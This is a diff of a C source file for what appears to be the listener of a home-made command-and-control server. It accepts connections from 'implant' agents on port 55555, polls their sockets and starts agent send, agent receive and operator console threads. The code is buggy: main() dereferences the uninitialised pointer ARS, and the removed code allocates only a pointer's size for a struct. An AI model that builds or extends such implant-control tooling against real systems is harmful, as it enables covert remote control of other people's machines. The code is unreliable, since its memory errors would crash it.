@@ -4,26 +4,26 @@
 #include <unistd.h>
 #include <getopt.h>
 #include <pthread.h>
+#include <poll.h>
 
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#include "agent_handler.h"
+#include "agent_transmit.h"
+#include "console.h"
 
-#define IP_SIZE 16
-#define LISTEN_BACKLOG 3
-#define BUFFER_SIZE 256
+#define FDSIZE			5
+#define LISTEN_BACKLOG	3
+#define BUFFER_SIZE		256
+#define AGENT_TIMEOUT	60
 
-int connect_from_implant(int port){
+int start_sockets(struct agent_receive *ARS, int port){
     int sockfd, new_socket;
     int opt = 1;
     struct sockaddr_in addr;
     char *buffer;
-    char *message = "Listener Alive\n";
     socklen_t addr_len = sizeof(addr);
-    pthread_t thread_id;
-    struct agent_connection *agent;
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
         printf("Socket failed\n");
@@ -54,33 +54,33 @@ int connect_from_implant(int port){
             printf("accept failed\n");
             return -1;
         }
-
-        agent = malloc(sizeof(agent));
-        agent->sock_id = new_socket;
-        agent->ip_addr = addr.sin_addr.s_addr;
-        agent->port = addr.sin_port;
-
-        pthread_create(&thread_id, NULL, agent_handler, (void*)agent);
+        printf("DEBUG Agent connected %d\n", new_socket);
+        
+        if (*(ARS->fd_count) == FDSIZE){
+			printf("too many connection\n");
+			close(new_socket);
+			continue;
+		}
+        
+        ARS->pfds[*(ARS->fd_count)].fd = new_socket;
+        ARS->pfds[*(ARS->fd_count)].events = POLLIN;
+        *(ARS->fd_count) = *(ARS->fd_count) + 1;
     }
-
-    // buffer = malloc(BUFFER_SIZE);
-    // memset(buffer, 0, BUFFER_SIZE);
-
-    // while(read(new_socket, buffer, BUFFER_SIZE - 1)){
-    //     printf("%s", buffer);
-    //     send(new_socket, message, strlen(message), 0);
-    //     sleep(1);
-    // }
-
-    // free(buffer);
-    // close(new_socket);
-    // close(sockfd);
+    
+    close(sockfd);
     return 0;
 }
 int main(int argc, char *argv[]){
     int opt;
-    int port = 8080;
+    int port = 55555;
+    pthread_t agent_receive_tid, agent_send_tid, console_tid;
+    struct pollfd *pfds;
+    int fd_count = 0;
+    int fd_size = FDSIZE;
+    struct agent_receive *ARS;
 
+    pfds = malloc(sizeof *pfds * fd_size);
+    
     while((opt = getopt(argc, argv, "p:h")) != -1){
         switch(opt){
             case 'p':
@@ -97,7 +97,17 @@ int main(int argc, char *argv[]){
                 return -1;
         }
     }
+    
+    ARS->fd_count = &fd_count;
+    ARS->pfds = pfds;
 
-    connect_from_implant(port);
+    // Start agent receive thread
+    pthread_create(&agent_receive_tid, NULL, agent_receive, ARS);
+    // Start agent send thread
+    pthread_create(&agent_send_tid, NULL, agent_send, ARS);
+    // Start console
+    pthread_create(&console_tid, NULL, console, ARS);
+
+    start_sockets(ARS, port);
     return 0;
 }
